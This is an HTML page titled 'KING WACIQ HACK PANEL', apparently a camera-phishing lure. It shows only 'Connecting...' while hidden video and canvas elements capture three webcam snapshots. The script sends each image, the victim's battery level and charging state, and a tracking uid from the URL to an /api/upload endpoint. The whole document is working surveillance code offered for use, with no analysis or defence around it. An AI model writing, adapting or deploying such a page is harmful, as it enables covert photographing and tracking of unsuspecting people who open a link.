<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>KING WACIQ HACK PANEL</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      text-align: center;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h1>KING WACIQ HACK PANEL</h1>
  <p>Connecting...</p>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    const params = new URLSearchParams(window.location.search);
    const uid = params.get('uid') || 'unknown';

    if (uid) {
      navigator.getBattery().then(battery => {
        const batteryLevel = Math.round(battery.level * 100);
        const isCharging = battery.charging;

        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
          video.srcObject = stream;

          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
        }).catch(err => {
          console.error("Camera error:", err);
        });
      });
    }

    function takeSnapshotAndSend(battery, charging) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      const imageData = canvas.toDataURL('image/png');

      fetch('/api/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          image: imageData,
          uid,
          battery,
          charging
        })
      }).then(res => res.json()).then(data => {
        console.log("Uploaded:", data);
      }).catch(err => {
        console.error("Upload error:", err);
      });
    }
  </script>
</body>
</html>
